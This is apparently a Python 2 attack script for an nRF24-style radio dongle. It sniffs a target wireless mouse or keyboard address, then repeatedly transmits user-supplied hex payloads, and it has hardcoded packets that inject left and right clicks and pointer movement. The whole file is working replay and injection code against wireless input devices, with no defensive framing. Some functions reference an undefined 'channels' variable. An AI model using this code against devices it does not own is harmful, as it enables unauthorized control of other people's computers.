import time, logging
from lib import common
import random
common.init_args('./replay.py')
common.parser.add_argument('-a', '--address', type=str, help='Known address', required=True)
common.parser.add_argument('-d', '--payloads', type=str, nargs='+' ,help='Need replay payloads', required=True, metavar='S')

common.parse_and_init()

address = common.args.address.replace(':', '').decode('hex')[::-1][:5]
address_string = ':'.join('{:02X}'.format(ord(b)) for b in address[::-1])

if len(address) < 2:
    raise Exception('Invalid address: {0}'.format(common.args.address))

common.radio.enter_sniffer_mode(address)


def replay():
    payloads = common.args.payloads
    c = random.choice(common.channels)

    print 'Trying address {0} on channel {1}'.format(address_string,c)
    common.radio.set_channel(c)
    for payload in payloads:
        print 'Tring send payload {0}'.format(payload)
        payload = payload.replace(':', '').decode('hex')
        common.radio.transmit_payload(payload)
    time.sleep(0.5)

def left_click():
    print 'Trying address {0}'.format(address_string)
    payloads = ["21:01:00:AB:11:D1"]
    common.radio.set_channel(79)
    for payload in payloads:
        payload = payload.replace(':', '').decode('hex')
        common.radio.transmit_payload(payload,2,3)
    time.sleep(1.0)

def right_click():
    print 'Trying address {0}'.format(address_string)
    payloads = ["21:02:00:AB:11:D1"]
    for c in channels:
        common.radio.set_channel(int(c))
        for payload in payloads:
            payload = payload.replace(':', '').decode('hex')
            common.radio.transmit_payload(payload,2,0)
        time.sleep(0.5)


def down_click():
    print 'Trying address {0}'.format(address_string)
    payloads = ["01:00:FF:0B:11:D1","01:00:FD:0B:11:D1","01:00:F9:0B:11:D1"]
    for c in channels:
        common.radio.set_channel(int(c))
        for payload in payloads:
            payload = payload.replace(':', '').decode('hex')
            common.radio.transmit_payload(payload,2,0)
        time.sleep(0.3)

def up_click():
    print 'Trying address {0}'.format(address_string)
    payloads = ["01:00:00:0B:11:D1","01:00:03:0B:11:D1","01:00:06:0B:11:D1"]
    for c in channels:
        common.radio.set_channel(int(c))
        for payload in payloads:
            payload = payload.replace(':', '').decode('hex')
            common.radio.transmit_payload(payload,2,0)
        time.sleep(0.3)


while True:
    replay()
    #down_click()
    #up_click()
    #right_click()
    #left_click()
